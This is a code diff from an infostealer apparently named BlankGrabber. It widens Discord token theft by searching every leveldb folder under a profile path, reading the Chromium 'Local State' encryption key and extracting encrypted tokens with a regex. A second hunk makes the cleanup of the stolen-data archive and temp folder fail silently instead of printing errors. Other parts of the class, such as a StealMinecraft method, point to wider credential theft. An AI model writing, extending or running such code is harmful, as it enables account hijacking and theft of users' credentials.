@@ -589,31 +589,37 @@ class Discord:
         encryptedTokens = list()
         tokens = list()
         key: str = None
+        levelDbPaths: list[str] = list()
 
         localStatePath = os.path.join(path, "Local State")
-        levelDbPath = os.path.join(path, "Local Storage", "leveldb")
 
-        if os.path.isfile(localStatePath) and os.path.isdir(levelDbPath):
+        for root, dirs, _ in os.walk(path):
+            for dir in dirs:
+                if dir == "leveldb":
+                    levelDbPaths.append(os.path.join(root, dir))
+
+        if os.path.isfile(localStatePath) and levelDbPaths:
             with open(localStatePath, errors= "ignore") as file:
                 jsonContent: dict = json.load(file)
                 
             key = jsonContent['os_crypt']['encrypted_key']
             key = base64.b64decode(key)[5:]
-                
-            for file in os.listdir(levelDbPath):
-                if file.endswith((".log", ".ldb")):
-                    filepath = os.path.join(levelDbPath, file)
-                    with open(filepath, errors= "ignore") as file:
-                        lines = file.readlines()
+            
+            for levelDbPath in levelDbPaths:
+                for file in os.listdir(levelDbPath):
+                    if file.endswith((".log", ".ldb")):
+                        filepath = os.path.join(levelDbPath, file)
+                        with open(filepath, errors= "ignore") as file:
+                            lines = file.readlines()
                         
-                    for line in lines:
-                        if line.strip():
-                            matches: list[str] = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
-                            for match in matches:
-                                match = match.rstrip("\\")
-                                if not match in encryptedTokens:
-                                    match = base64.b64decode(match.split("dQw4w9WgXcQ:")[1].encode())
-                                    encryptedTokens.append(match)
+                        for line in lines:
+                            if line.strip():
+                                matches: list[str] = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
+                                for match in matches:
+                                    match = match.rstrip("\\")
+                                    if not match in encryptedTokens:
+                                        match = base64.b64decode(match.split("dQw4w9WgXcQ:")[1].encode())
+                                        encryptedTokens.append(match)
         
         for token in encryptedTokens:
             try:
@@ -749,8 +755,8 @@ class BlankGrabber:
         try:
             os.remove(self.ArchivePath)
             shutil.rmtree(self.TempFolder)
-        except Exception as e:
-            print(e)
+        except Exception:
+            pass
 
     @Errors.Catch
     def StealMinecraft(self) -> None:
